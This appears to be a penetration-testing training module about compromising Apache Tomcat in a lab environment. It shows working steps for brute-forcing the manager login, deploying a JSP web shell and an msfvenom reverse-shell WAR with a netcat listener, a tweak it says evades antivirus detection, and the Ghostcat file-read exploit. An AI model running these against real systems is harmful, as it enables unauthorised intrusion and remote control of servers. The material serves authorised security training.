 If we can access the `/manager` or `/host-manager` endpoints, we can likely achieve remote code execution on the Tomcat server. Let's start by brute-forcing the Tomcat manager page on the Tomcat instance at `http://web01.inlanefreight.local:8180`. We can use the [auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) Metasploit module for these purposes, Burp Suite Intruder or any number of scripts to achieve this. We'll use Metasploit for our purposes.

## Tomcat Manager - Login Brute Force
We first have to set a few options. Again, we must specify the vhost and the target's IP address to interact with the target properly. We should also set STOP_ON_SUCCESS to true so the scanner stops when we get a successful login, no use in generating loads of additional requests after a successful login.

```
        shellsession
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

As always, we check to make sure everything is set up correctly by show options.
```
        shellsession
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options 
```

We hit `run` and get a hit for the credential pair `tomcat:admin`.

No one tool is better than another, and it does not make us a "bad" penetration tester if we use certain tools like Metasploit to our advantage. Provided we understand each scanner and exploit script that we run and the risks, then utilizing this scanner properly is no different from using Burp Intruder or writing a custom Python script. It is vital for us to understand `how` our tools work and how to do many things manually. We could manually try each credential pair in the browser or script this using `cURL` or Python if we choose. At the very least, if we decide to use a certain tool, we should be able to explain its usage and potential impact to our clients should they question us during or after the assessment.

Let's say a particular Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot. To do this, first, fire up Burp Suite and then set the `PROXIES` option like the following:

        shellsession
`msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080`

We can see in Burp exactly how the scanner is working, taking each credential pair and base64 encoding into account for basic auth that Tomcat uses.

A quick check of the value in the `Authorization` header for one request shows that the scanner is running correctly, base64 encoding the credentials `admin:vagrant` the way the Tomcat application would do when a user attempts to log in directly from the web application. Try this out for some examples throughout this module to start getting comfortable with debugging through a proxy.

        shellsession
`tylapcheong@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -d admin:vagrant`

We can also use [this](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) Python script to achieve the same result.

This is a very straightforward script that takes a few arguments. We can run the script with `-h` to see what it requires to run.

        shellsession
`tylapcheong@htb[/htb]$ python3 mgr_brute.py  -h`

We can try out the script with the default Tomcat users and passwords file that the above Metasploit module uses. We run it and get a hit!

        shellsession
`tylapcheong@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`

## Tomcat Manager - WAR File Upload

Many Tomcat installations provide a GUI interface to manage the application. This interface is available at `/manager/html` by default, which only users assigned the `manager-gui` role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.

After performing a brute force attack and answering questions 1 and 2 below, browse to `http://web01.inlanefreight.local:8180/manager/html` and enter the credentials.

The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive.

```
tylapcheong@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

tylapcheong@htb[/htb]$ zip -r backup.war cmd.jsp 

  adding: cmd.jsp (deflated 81%)
```

Click on `Browse` to select the .war file and then click on `Deploy`.

This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table.

If we click on `backup`, we will get redirected to `http://web01.inlanefreight.local:8180/backup/` and get a `404 Not Found` error. We need to specify the `cmd.jsp` file in the URL as well. Browsing to `http://web01.inlanefreight.local:8180/backup/cmd.jsp` will present us with a web shell that we can use to run commands on the Tomcat server. From here, we could upgrade our web shell to an interactive reverse shell and continue. Like previous examples, we can interact with this web shell via the browser or using `cURL` on the command line. Try both!

        shellsession
`tylapcheong@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id`

To clean up after ourselves, we can go back to the main Tomcat Manager page and click the `Undeploy` button next to the `backups` application after, of course, noting down the file and upload location for our report, which in our example is `/opt/tomcat/apache-tomcat-10.0.10/webapps`. If we do an `ls` on that directory from our web shell, we'll see the uploaded `backup.war` file and the `backup` directory containing the `cmd.jsp` script and `META-INF` created after the application deploys. Clicking on `Undeploy` will typically remove the uploaded WAR archive and the directory associated with the application.


We could also use `msfvenom` to generate a malicious WAR file. The payload [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) will execute a reverse shell through a JSP file. Browse to the Tomcat console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it.

        shellsession
`tylapcheong@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war`

Start a Netcat listener and click on `/backup` to execute the shell.

        shellsession
`tylapcheong@htb[/htb]$ nc -lnvp 4443`

The [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module can be used to automate the process shown above, but we'll leave this as an exercise for the reader.

[This](https://github.com/SecurityRiskAdvisors/cmd.jsp) JSP web shell is very lightweight (under 1kb) and utilizes a [Bookmarklet](https://www.freecodecamp.org/news/what-are-bookmarklets/) or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded `cmd.jsp` would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit).

A simple change such as changing:

        java
`FileOutputStream(f);stream.write(m);o="Uploaded:`

to:

        java
`FileOutputStream(f);stream.write(m);o="uPlOaDeD:`

results in 0/58 security vendors flagging the `cmd.jsp` file as malicious at the time of writing.

## A Quick Note on Web shells

When we upload web shells (especially on externals), we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold.

## CVE-2020-1938 : Ghostcat

Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938). All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable.

The AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan.

        shellsession
`tylapcheong@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local`

The above scan confirms that ports 8080 and 8009 are open. The PoC code for the vulnerability can be found [here](https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). Download the script and save it locally. The exploit can only read files and folders within the web apps folder, which means that files like `/etc/passwd` can’t be accessed. Let’s attempt to access the web.xml.

        shellsession
`tylapcheong@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml`

In some Tomcat installs, we may be able to access sensitive data within the WEB-INF file.